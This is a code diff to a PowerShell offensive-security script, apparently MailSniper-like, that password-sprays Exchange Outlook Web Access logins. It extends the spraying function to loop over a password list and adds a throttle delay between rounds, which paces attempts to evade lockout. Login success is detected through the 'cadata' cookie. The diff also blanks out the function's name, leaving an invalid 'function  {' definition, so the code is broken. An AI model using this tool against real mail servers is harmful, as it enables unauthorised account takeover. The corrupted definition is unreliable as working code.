@@ -1551,7 +1551,7 @@ function Get-GlobalAddressList{
     }
 }
 
-function Invoke-PasswordSprayOWA{
+function  {
 
 <#
   .SYNOPSIS
@@ -1605,7 +1605,7 @@ function Invoke-PasswordSprayOWA{
   Param(
 
 
-    [Parameter(Position = 0, Mandatory = $false)]
+    [Parameter(Position = 0, Mandatory = $true)]
     [system.URI]
     $ExchHostname = "",
 
@@ -1619,15 +1619,23 @@ function Invoke-PasswordSprayOWA{
 
     [Parameter(Position = 3, Mandatory = $False)]
     [string]
-    $Password = "",
+    $PasswordList = "",
 
     [Parameter(Position = 4, Mandatory = $False)]
+    [string]
+    $Password = "",
+
+    [Parameter(Position = 5, Mandatory = $False)]
     [string]
     $Threads = "5",
 
     [Parameter(Position = 6, Mandatory = $False)]
     [string]
-    $Domain = ""
+    $Domain = "",
+    
+    [Parameter(Position = 7, Mandatory = $False)]
+    [string]
+    $ThrottleTime = 0
 
   )
     
@@ -1635,14 +1643,15 @@ function Invoke-PasswordSprayOWA{
     #Setting up URL's for later
     $OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")
     $OWAURL2 = ("https://" + $ExchHostname + "/owa/")
-     
     $Usernames = Get-Content $UserList
+    $Passwords = Get-Content $PasswordList
     $count = $Usernames.count
     $sprayed = @()
     $userlists = @{}
     $count = 0 
     $Usernames |% {$userlists[$count % $Threads] += @($_);$count++}
 
+    ForEach ($Password in $Passwords) {
     0..($Threads-1) |% {
 
     Start-Job -ScriptBlock{
@@ -1700,10 +1709,10 @@ function Invoke-PasswordSprayOWA{
 	$form = $owa.Forms[0]
 	$form.fields.password=$Password
 	$form.fields.username=$Username
-        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body  $form.Fields -MaximumRedirection 2 -SessionVariable sess -ErrorAction SilentlyContinue 
-        #Check cookie in response
-        $cookies = $sess.Cookies.GetCookies($OWAURL2)
-        foreach ($cookie in $cookies)
+    $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body  $form.Fields -MaximumRedirection 2 -SessionVariable sess -ErrorAction SilentlyContinue 
+    #Check cookie in response
+    $cookies = $sess.Cookies.GetCookies($OWAURL2)
+    foreach ($cookie in $cookies)
         {
             if ($cookie.Name -eq "cadata")
                 {
@@ -1719,6 +1728,9 @@ function Invoke-PasswordSprayOWA{
     }
     } -ArgumentList $userlists[$_], $Password, $OWAURL2, $OWAURL, $Domain | Out-Null
 
+}
+Write-Host "[*] Waiting $ThrottleTime minute(s) to try next password"
+Start-Sleep -Seconds ([int32]$ThrottleTime*60)
 }
 $Complete = Get-Date
 $MaxWaitAtEnd = 10000
